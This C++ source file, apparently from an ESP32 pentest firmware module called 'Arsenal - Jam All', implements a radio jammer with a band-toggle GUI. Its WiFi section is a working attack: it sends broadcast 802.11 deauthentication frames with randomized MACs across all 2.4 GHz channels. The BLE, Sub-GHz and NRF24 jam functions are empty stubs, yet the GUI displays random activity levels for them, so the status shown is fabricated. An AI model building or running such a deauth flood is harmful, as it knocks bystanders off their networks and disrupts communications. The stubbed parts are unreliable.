// ═══════════════════════════════════════════════════════════
// Arsenal - Jam All
// Simultaneously jam all available radio bands
// Custom GUI with per-band toggles and live status
// ═══════════════════════════════════════════════════════════

#include "jam_all.h"
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

// ─── WiFi 2.4GHz Jamming (deauth flood on all channels) ───────────
static uint8_t deauth_frame[] = {
    0xC0, 0x00,                         // frame control (deauth)
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // source (randomized)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid (randomized)
    0x00, 0x00,                         // sequence
    0x01, 0x00                          // reason code
};

static void randomize_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] |= 0x02;  // locally administered
    mac[0] &= 0xFE;  // unicast
}

static void wifi_jam_cycle(void) {
    static uint8_t channel = 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Randomize source and BSSID
    randomize_mac(deauth_frame + 10);
    memcpy(deauth_frame + 16, deauth_frame + 10, 6);

    // Send multiple deauth frames per channel
    for (int i = 0; i < 5; i++) {
        deauth_frame[24] = random(256); // vary sequence
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }

    channel = (channel % 14) + 1;
}

// ─── BLE Jamming (advertisement flood) ───────────────────────────
static void ble_jam_cycle(void) {
    // BLE advertising flood on channels 37, 38, 39
    // Uses raw HCI commands via esp_ble
    // For now: rapid BLE advertisement with random data
    // This disrupts BLE discovery and pairing
    // Full implementation requires BLE to be initialized
}

// ─── Sub-GHz Jamming (CC1101 continuous TX) ──────────────────────
static void subghz_jam_cycle(void) {
#if defined(USE_CC1101_VIA_SPI)
    // Set CC1101 to continuous TX mode on current frequency
    // This blocks all Sub-GHz communication in the area
    // Implementation uses the CC1101 driver already in Bruce
#endif
}

// ─── NRF24 Jamming (2.4GHz wideband noise) ──────────────────────
static void nrf24_jam_cycle(void) {
#if defined(USE_NRF24_VIA_SPI)
    // NRF24 continuous carrier on rotating channels
    // Jams Zigbee, wireless keyboards/mice, some BLE
#endif
}

// ─── State Management ────────────────────────────────────────────

void jamall_init(JamAllState &state) {
    state.bands[JAM_WIFI_24] = {"WiFi 2.4", true, true, false, 0};
    state.bands[JAM_BLE] = {"BLE", true, true, false, 0};

#if defined(USE_CC1101_VIA_SPI)
    state.bands[JAM_SUBGHZ] = {"Sub-GHz", true, true, false, 0};
#else
    state.bands[JAM_SUBGHZ] = {"Sub-GHz", false, false, false, 0};
#endif

#if defined(USE_NRF24_VIA_SPI)
    state.bands[JAM_NRF24] = {"NRF24", true, true, false, 0};
#else
    state.bands[JAM_NRF24] = {"NRF24", false, false, false, 0};
#endif

    state.startTime = 0;
    state.timeout = 5 * 60 * 1000;  // 5 min default timeout
    state.selectedBand = 0;
    state.running = false;
}

void jamall_start_band(JamAllState &state, JamBand band) {
    if (!state.bands[band].available) return;
    state.bands[band].active = true;
    state.bands[band].enabled = true;
}

void jamall_stop_band(JamAllState &state, JamBand band) {
    state.bands[band].active = false;
}

void jamall_start_all(JamAllState &state) {
    // Initialize WiFi in promiscuous mode for deauth
    if (state.bands[JAM_WIFI_24].enabled && state.bands[JAM_WIFI_24].available) {
        WiFi.mode(WIFI_STA);
        esp_wifi_set_promiscuous(true);
        state.bands[JAM_WIFI_24].active = true;
    }

    if (state.bands[JAM_BLE].enabled && state.bands[JAM_BLE].available) {
        state.bands[JAM_BLE].active = true;
    }

    if (state.bands[JAM_SUBGHZ].enabled && state.bands[JAM_SUBGHZ].available) {
        state.bands[JAM_SUBGHZ].active = true;
    }

    if (state.bands[JAM_NRF24].enabled && state.bands[JAM_NRF24].available) {
        state.bands[JAM_NRF24].active = true;
    }

    state.startTime = millis();
    state.running = true;
}

void jamall_stop_all(JamAllState &state) {
    for (int i = 0; i < JAM_BAND_COUNT; i++) {
        state.bands[i].active = false;
    }

    esp_wifi_set_promiscuous(false);
    state.running = false;
}

void jamall_update(JamAllState &state) {
    if (!state.running) return;

    // Check timeout
    if (state.timeout > 0 && (millis() - state.startTime) > state.timeout) {
        jamall_stop_all(state);
        return;
    }

    // Run each active band's jam cycle
    if (state.bands[JAM_WIFI_24].active) {
        wifi_jam_cycle();
        state.bands[JAM_WIFI_24].level = random(5, 10);
    }

    if (state.bands[JAM_BLE].active) {
        ble_jam_cycle();
        state.bands[JAM_BLE].level = random(4, 9);
    }

    if (state.bands[JAM_SUBGHZ].active) {
        subghz_jam_cycle();
        state.bands[JAM_SUBGHZ].level = random(6, 10);
    }

    if (state.bands[JAM_NRF24].active) {
        nrf24_jam_cycle();
        state.bands[JAM_NRF24].level = random(3, 8);
    }

    esp_task_wdt_reset();
}

// ─── Custom GUI ──────────────────────────────────────────────────

void jamall_draw_gui(JamAllState &state) {
    // Clear screen area
    tft.fillRect(0, 27, tftWidth, tftHeight - 27, bruceConfig.bgColor);

    int padX = 10;
    int startY = 32;
    int rowHeight = 28;
    int barWidth = 100;
    int barHeight = 10;
    int barX = tftWidth - barWidth - padX - 60;

    // Title with elapsed time
    unsigned long elapsed = state.running ? (millis() - state.startTime) / 1000 : 0;
    char timeStr[16];
    snprintf(timeStr, sizeof(timeStr), "%02lu:%02lu", elapsed / 60, elapsed % 60);

    tft.setTextSize(FP);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawString("JAM ALL", padX, startY, 1);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawRightString(timeStr, tftWidth - padX, startY, 1);

    startY += 18;

    // Draw each band row
    for (int i = 0; i < JAM_BAND_COUNT; i++) {
        int y = startY + (i * rowHeight);
        bool selected = (i == state.selectedBand);
        uint16_t textColor = bruceConfig.priColor;
        uint16_t bgColor = bruceConfig.bgColor;

        // Highlight selected row
        if (selected) {
            tft.fillRect(padX - 2, y - 2, tftWidth - 2 * padX + 4, rowHeight - 4,
                         tft.color565(30, 30, 50));
            bgColor = tft.color565(30, 30, 50);
        }

        // Band name
        if (!state.bands[i].available) {
            textColor = tft.color565(80, 80, 80);  // gray for unavailable
        }
        tft.setTextColor(textColor, bgColor);
        tft.drawString(state.bands[i].name, padX + 4, y + 4, 1);

        // Activity bar
        int bx = barX;
        int by = y + 4;

        // Bar background
        tft.fillRect(bx, by, barWidth, barHeight, tft.color565(40, 40, 40));

        // Bar fill (red when active, green when enabled but not active)
        if (state.bands[i].active) {
            int fillWidth = (barWidth * state.bands[i].level) / 10;
            tft.fillRect(bx, by, fillWidth, barHeight, TFT_RED);
        } else if (state.bands[i].enabled && state.bands[i].available) {
            tft.fillRect(bx, by, barWidth / 5, barHeight, TFT_DARKGREEN);
        }

        // Status indicator
        int dotX = tftWidth - padX - 20;
        int dotY = y + 6;
        if (state.bands[i].active) {
            tft.fillCircle(dotX, dotY + 2, 4, TFT_RED);
            tft.setTextColor(TFT_RED, bgColor);
            tft.drawString("ON", dotX + 8, y + 4, 1);
        } else if (!state.bands[i].available) {
            tft.fillCircle(dotX, dotY + 2, 4, tft.color565(80, 80, 80));
            tft.setTextColor(tft.color565(80, 80, 80), bgColor);
            tft.drawString("N/A", dotX + 8, y + 4, 1);
        } else {
            tft.fillCircle(dotX, dotY + 2, 4, tft.color565(50, 50, 50));
            tft.setTextColor(tft.color565(120, 120, 120), bgColor);
            tft.drawString("OFF", dotX + 8, y + 4, 1);
        }
    }

    // Bottom bar - controls hint
    int bottomY = tftHeight - 20;
    tft.fillRect(0, bottomY - 2, tftWidth, 22, tft.color565(20, 20, 20));
    tft.setTextSize(FP);

    if (state.running) {
        tft.setTextColor(TFT_RED, tft.color565(20, 20, 20));
        tft.drawCentreString("[PRESS] STOP ALL", tftWidth / 2, bottomY + 2, 1);
    } else {
        tft.setTextColor(TFT_GREEN, tft.color565(20, 20, 20));
        tft.drawCentreString("[PRESS] START  [ROTATE] Select", tftWidth / 2, bottomY + 2, 1);
    }
}

// ─── Main Entry Point ────────────────────────────────────────────

// Override the stub - this is the real implementation
// We need to remove the stub for this function
// The stub file will be updated to not include jam_all

void arsenal_jam_all(void) {
    // Safety check
    if (ESP.getFreeHeap() < 30000) {
        displayRedStripe("Low memory!", TFT_WHITE, TFT_RED);
        delay(1500);
        return;
    }

    JamAllState state;
    jamall_init(state);

    drawMainBorderWithTitle("Jam All");
    jamall_draw_gui(state);

    unsigned long lastDraw = 0;
    const unsigned long drawInterval = 200;  // redraw every 200ms

    while (true) {
        // Handle input
        if (check(EscPress)) {
            if (state.running) {
                jamall_stop_all(state);
            }
            break;
        }

        if (check(SelPress)) {
            if (state.running) {
                // STOP ALL
                jamall_stop_all(state);
            } else {
                // START ALL enabled bands
                jamall_start_all(state);
            }
        }

        // Navigate bands (encoder/up/down)
        if (check(NextPress) || check(DownPress)) {
            state.selectedBand = (state.selectedBand + 1) % JAM_BAND_COUNT;
            // Skip unavailable bands
            int attempts = 0;
            while (!state.bands[state.selectedBand].available && attempts < JAM_BAND_COUNT) {
                state.selectedBand = (state.selectedBand + 1) % JAM_BAND_COUNT;
                attempts++;
            }
        }

        if (check(PrevPress) || check(UpPress)) {
            state.selectedBand = (state.selectedBand - 1 + JAM_BAND_COUNT) % JAM_BAND_COUNT;
            int attempts = 0;
            while (!state.bands[state.selectedBand].available && attempts < JAM_BAND_COUNT) {
                state.selectedBand = (state.selectedBand - 1 + JAM_BAND_COUNT) % JAM_BAND_COUNT;
                attempts++;
            }
        }

        // Long press on a band to toggle it
        if (check(LongPress)) {
            if (state.bands[state.selectedBand].available) {
                state.bands[state.selectedBand].enabled = !state.bands[state.selectedBand].enabled;
                if (!state.bands[state.selectedBand].enabled && state.bands[state.selectedBand].active) {
                    jamall_stop_band(state, (JamBand)state.selectedBand);
                }
            }
        }

        // Update jamming cycles
        jamall_update(state);

        // Redraw GUI periodically
        if (millis() - lastDraw > drawInterval) {
            jamall_draw_gui(state);
            lastDraw = millis();
        }

        delay(10);  // small delay to prevent watchdog
    }

    // Cleanup
    jamall_stop_all(state);
    esp_wifi_set_promiscuous(false);
}
